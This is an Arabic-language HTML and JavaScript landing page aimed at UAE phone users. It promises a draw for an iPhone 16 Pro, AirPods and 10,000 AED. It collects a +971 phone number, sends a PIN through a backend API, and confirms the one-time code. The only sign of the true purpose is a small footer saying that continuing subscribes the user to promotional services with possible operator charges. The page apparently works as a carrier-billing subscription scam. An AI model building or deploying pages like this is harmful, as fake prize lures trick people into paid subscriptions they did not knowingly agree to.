<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta
name="viewport"
content="width=device-width, initial-scale=1.0"
/>

<title>UAE Offer</title>

<link
href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap"
rel="stylesheet"
/>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Cairo',sans-serif;
}

body{

    background:
    linear-gradient(
    180deg,
    #2d0066 0%,
    #4b00a8 100%
    );

    min-height:100vh;

    overflow-x:hidden;

    color:white;
}

.container{

    width:100%;
    max-width:420px;

    margin:auto;

    padding:16px;

    text-align:center;
}

/* BADGE */

.badge{

    display:inline-flex;

    align-items:center;

    gap:8px;

    background:#ffd500;

    color:black;

    padding:8px 18px;

    border-radius:999px;

    font-size:15px;

    font-weight:900;

    margin-top:10px;

    box-shadow:
    0 10px 30px rgba(255,213,0,.3);

}

.flag{

    width:22px;
}

/* TITLE */

h1{

    font-size:34px;

    line-height:1.4;

    margin-top:16px;

    font-weight:900;
}

.highlight{

    color:#ffd500;
}

.sub{

    margin-top:10px;

    font-size:16px;

    line-height:1.7;

    color:#f3f3f3;
}

/* GIFT */

.gift{

    width:70px;

    margin-top:14px;

    animation:float 2s infinite ease-in-out;
}

@keyframes float{

    0%{
        transform:translateY(0px);
    }

    50%{
        transform:translateY(-8px);
    }

    100%{
        transform:translateY(0px);
    }

}

/* PRIZE BOX */

.prize-box{

    display:flex;

    gap:10px;

    margin-top:18px;
}

.prize{

    flex:1;

    background:
    linear-gradient(
    180deg,
    #6b21a8,
    #581c87
    );

    border:2px solid #ffd500;

    border-radius:18px;

    padding:10px 6px;

    box-shadow:
    0 0 20px rgba(255,213,0,.18);

    backdrop-filter:blur(8px);
}

.prize img{

    width:70px;

    height:70px;

    object-fit:contain;

    filter:
    drop-shadow(0 6px 10px rgba(0,0,0,.3));
}

.prize-title{

    margin-top:6px;

    font-size:14px;

    font-weight:900;
}

/* FORM */

.form-box{

    margin-top:16px;

    background:#f8f8f8;

    border-radius:28px;

    padding:20px 16px;

    box-shadow:
    0 20px 40px rgba(0,0,0,.25);
}

.form-title{

    color:#5b21b6;

    font-size:18px;

    font-weight:900;

    margin-bottom:14px;
}

/* PHONE INPUT */

.phone-box{

    display:flex;

    direction:ltr;

    width:100%;

    overflow:hidden;

    border-radius:20px;

    border:3px solid #ddd;

    background:white;
}

.prefix{

    width:90px;

    background:#e5e5e5;

    display:flex;

    align-items:center;

    justify-content:center;

    font-size:24px;

    font-weight:900;

    color:black;
}

.phone-box input{

    flex:1;

    border:none;

    outline:none;

    padding:20px;

    font-size:24px;

    color:#777;

    direction:rtl;

    text-align:right;
}

/* BUTTON */

.claim-btn{

    width:100%;

    margin-top:18px;

    border:none;

    border-radius:22px;

    padding:18px;

    font-size:28px;

    font-weight:900;

    cursor:pointer;

    background:
    linear-gradient(
    180deg,
    #ffe14d,
    #ffd000
    );

    color:black;

    box-shadow:
    0 15px 30px rgba(255,213,0,.35);

    transition:.2s;
}

.claim-btn:hover{

    transform:scale(1.02);
}

/* OTP */

#otpBox{

    display:none;

    margin-top:18px;
}

#otp{

    width:100%;

    padding:18px;

    border-radius:18px;

    border:2px solid #ddd;

    font-size:22px;

    text-align:center;

    margin-bottom:12px;
}

.verify-btn{

    width:100%;

    border:none;

    background:
    linear-gradient(
    180deg,
    #7c3aed,
    #6d28d9
    );

    color:white;

    font-size:24px;

    font-weight:900;

    padding:18px;

    border-radius:18px;

    cursor:pointer;
}

/* FLASH */

.flash{

    margin-top:16px;

    color:#7c3aed;

    font-size:15px;

    font-weight:900;

    animation:blink 1s infinite;
}

@keyframes blink{

    0%{
        opacity:1;
    }

    50%{
        opacity:.5;
    }

    100%{
        opacity:1;
    }

}

/* FOOTER */

.footer{

    margin-top:22px;

    color:#f1f1f1;

    font-size:12px;

    line-height:1.8;
}

</style>

</head>

<body>

<div class="container">

<div class="badge">

<img
class="flag"
src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Flag_of_the_United_Arab_Emirates.svg"
/>

عرض حصري للإمارات

</div>

<h1>

اربح
<span class="highlight">
آيفون 16 برو
</span>

</h1>

<div class="sub">

أدخل رقم هاتفك الآن للدخول في السحب والفوز بجوائز مذهلة

</div>

<img
class="gift"
src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png"
/>

<div class="prize-box">

<div class="prize">

<img
src="https://i.ibb.co/XZbtrpsJ/111851-sp880-airpods-Pro-2nd-gen.png"
/>

<div class="prize-title">
AirPods
</div>

</div>

<div class="prize">

<img
src="https://i.ibb.co/S7WWWXJN/cash.png"
/>

<div class="prize-title">
10,000 AED
</div>

</div>

<div class="prize">

<img
src="https://i.ibb.co/B5tGx9x2/iphone-16.png"
/>

<div class="prize-title">
iPhone 16
</div>

</div>

</div>

<div class="form-box">

<div class="form-title">

أدخل رقم هاتفك

</div>

<div class="phone-box">

<input
id="msisdn"
placeholder="xxxxxxxxx"
maxlength="9"
inputmode="numeric"
pattern="[0-9]*"
oninput="this.value=this.value.replace(/[^0-9]/g,'')"
/>

<div class="prefix">
+971
</div>

</div>

<button
class="claim-btn"
onclick="sendPIN()"
>

اشترك الآن

</button>

<div class="flash">

⚡ عدد الفائزين محدود يومياً

</div>

<div id="otpBox">

<input
id="otp"
placeholder="أدخل رمز التحقق"
/>

<button
class="verify-btn"
onclick="verifyOTP()"
>

تأكيد الرمز

</button>

</div>

</div>

<div class="footer">

بالمتابعة، فإنك توافق على الاشتراك
في الخدمات الترويجية.
قد يتم تطبيق رسوم المشغل.

</div>

</div>

<script>

let currentTxid = null;


// SEND PIN

async function sendPIN(){

    let msisdn =
    document.getElementById('msisdn').value;

    msisdn =
    msisdn.replace(/\s/g,'');

    msisdn =
    msisdn.replace('+','');

    if(msisdn.startsWith('0')){

        msisdn =
        '971' + msisdn.substring(1);

    }

    else if(!msisdn.startsWith('971')){

        msisdn =
        '971' + msisdn;

    }

    if(msisdn.length < 12){

        alert('يرجى إدخال رقم إماراتي صحيح');

        return;
    }

    try{

        const response =
        await fetch('/api/send-pin',{

            method:'POST',

            headers:{
                'Content-Type':'application/json'
            },

            body:JSON.stringify({
                msisdn:msisdn
            })

        });

        const data =
        await response.json();

        console.log(data);

        if(data.txid){

            currentTxid =
            data.txid;

            document
            .getElementById('otpBox')
            .style.display='block';

            alert('تم إرسال رمز التحقق');

        }else{

            alert('فشل إرسال الرمز');

        }

    }catch(err){

        console.log(err);

        alert('خطأ في النظام');

    }

}


// VERIFY OTP

async function verifyOTP(){

    const otp =
    document.getElementById('otp').value;

    if(!otp){

        alert('أدخل رمز التحقق');

        return;
    }

    try{

        const response =
        await fetch('/api/verify-pin',{

            method:'POST',

            headers:{
                'Content-Type':'application/json'
            },

            body:JSON.stringify({

                txid:currentTxid,

                pin:otp

            })

        });

        const data =
        await response.json();

        console.log(data);

        if(data.success){

            alert('تم الاشتراك بنجاح');

            window.location.href =
            'https://google.com';

        }else{

            alert('رمز التحقق غير صحيح');

        }

    }catch(err){

        console.log(err);

        alert('فشل التحقق');

    }

}

</script>

</body>
</html>
